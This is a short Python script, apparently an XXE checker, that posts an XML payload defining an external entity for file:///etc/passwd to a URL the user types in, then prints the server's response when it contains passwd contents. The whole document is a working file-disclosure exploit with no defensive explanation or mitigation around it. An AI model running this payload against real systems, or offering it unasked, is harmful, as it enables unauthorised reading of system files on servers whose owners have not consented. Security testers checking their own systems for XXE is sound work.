import requests

def check_xxe_vulnerability(target_url):
    # XXE payload to check for file disclosure
    xxe_payload = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>'''

    headers = {
        'Content-Type': 'application/xml'
    }

    try:
        response = requests.post(target_url, data=xxe_payload, headers=headers, timeout=10)

        if 'root:x' in response.text:
            print(f"[+] XXE vulnerability detected! The target is disclosing /etc/passwd")
            print(response.text)
        else:
            print(f"[-] No XXE vulnerability detected or the target is not disclosing /etc/passwd")

    except requests.exceptions.RequestException as e:
        print(f"Error making request: {e}")

# Example usage
target_url = input("Enter the target URL: ")
check_xxe_vulnerability(target_url)
